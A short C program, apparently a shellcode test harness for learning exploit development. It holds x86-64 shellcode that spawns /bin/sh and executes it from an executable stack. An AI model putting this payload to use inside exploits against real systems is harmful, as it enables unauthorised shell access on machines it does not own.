// gcc -z execstack -o example example.c

int main(){
    char sc[] = "H1\xf6H1\xd2H1\xc0\xb0;H\xbf/bin/sh\x00WH\x89\xe7\x0f\x05";
    void (*func_ptr)(void);
    func_ptr = sc;
    (*func_ptr)();
    return 0;
}